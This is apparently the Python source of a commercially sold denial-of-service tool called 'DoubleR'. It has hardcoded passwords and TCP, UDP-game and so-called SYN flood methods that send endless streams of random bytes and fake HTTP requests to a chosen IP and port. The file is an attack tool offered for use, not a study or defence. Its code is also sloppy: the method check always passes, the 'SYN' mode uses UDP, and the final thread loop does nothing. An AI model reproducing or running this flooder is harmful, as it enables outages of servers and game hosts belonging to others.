import os
import time
import socket
import sys
import random
import threading

os.system('title DoubleR TeamINV Tools By RizzINV')
logo="""\033[91m\n
██████╗  ██████╗ ██╗   ██╗██████╗ ██╗     ███████╗██████╗ 
██╔══██╗██╔═══██╗██║   ██║██╔══██╗██║     ██╔════╝██╔══██╗
██║  ██║██║   ██║██║   ██║██████╔╝██║     █████╗  ██████╔╝
██║  ██║██║   ██║██║   ██║██╔══██╗██║     ██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝╚██████╔╝██████╔╝███████╗███████╗██║  ██║
╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
\033[91mTools By RizzINV & RymuxINV #TEAMINV
"""
pasw1 = "zacknihbos77"
pasw = "invictus"

print(logo)

for i in range(3):
    print("╔══[PASSWORD]")
    pwd = input("╚════>  ")
    j = 3
    if (pwd == pasw):
        time.sleep(3)
        print("[Welcome Back Admin]")
        time.sleep(2)
        print("[Thanks For Create Tools]")
        time.sleep(2)
        print("Credit : RizzINV,RymuxINV,ReyooINV")
        time.sleep(2)
        break
    elif (pwd == pasw1):
        time.sleep(2)
        print("[Welcome User!!]")
        time.sleep(2)
        print("[Thanks For Buying]")
        time.sleep(2)
        print("[Dont Resell Tools #TeamINV]")
        time.sleep(2)
        break
    else:
        time.sleep(2)
        print("[WRONG User or Password]")
        continue
os.system('cls')

banner = """
\033[91m]|------------|------------|
\033[91m]|   Methods  |   target   |
\033[91m]|------------|------------|
\033[91m]|>TCP        | 80,443,22  |
\033[91m]|>UDP-GAME   | 17091/7777 |
\033[91m]|>SYN        | 443,80     |
\033[91m]|------------|------------|
\033[91m]#Dont RESELL #TeamINV >~<
"""



os.system('title Invictus Tools By Rizzinv RymuxINV')
print(banner)
method = str(input("┌──[METHOD] \n└───#"))
if method == "TCP" or "UDP-GAME" or "SYN":
    print("Method Available")
else:
    print("Invalid Method")
ip = str(input("┌──[ip] \n└───# "))
port = int(input("┌──[port] \n└───#"))
threads = int(input("┌──[thread default : 1000]\n└───"))
time = str(input("-->[Time]\n#----->"))
#urandom gw ni cok jgn di sebar ~IREL
#code nya udah bener 100% ni kntod gua rombak dri awal
byte1 = random._urandom(50411)

if method == "TCP":
     connect = "Connection : keep-Alive\r\n\r\n"
     get_rand = random.choice(['GET','POST',"HEAD"])
     get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
     request = get_host + connect + get_rand +  "\r\n"
     while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip,port))
            s.send(byte1)
            s.send(byte1)
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            for x in range(threads):
                s.send(byte1)
                s.send(byte1)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                print("Get Attack By DoubleR")
        except socket.error:
            s.close()

if method == "UDP-GAME":
        connect = "Connection : keep-Alive\r\n\r\n"
        get_rand = random.choice(['GET','POST',"HEAD"])
        get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
        if method == "UDP-GAME":
            request = get_host + connect + get_rand + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.connect((ip,port))
                s.send(byte1)
                s.send(byte1)
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
                for x in range(threads):
                    s.send(byte1)
                    s.send(byte1)
                    s.sendall(str.encode(request))
                    s.sendall(str.encode(request))
                    print("Get Attack By DoubleR")
            except socket.error:
                s.close()


if method == "SYN":
    connect = "Connection : keep-Alive\r\n\r\n"
    get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"

    request = get_host + connect + "\n"
    while True:
        o = ["!","#","+","=","/"]
        i = random.choice(o)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((ip,port))
        try:
            for x in range(threads):
                s.sendall(str.encode(request))
            print(print(f"[{i}]" + "ATTACK!!{}".format(ip)))
        except ConnectionAbortedError:
            print(f"[{i}]" + "DOWN".format(ip))
        s.close()

for y in range(9024):
    t = threading.Thread()
    t.start()
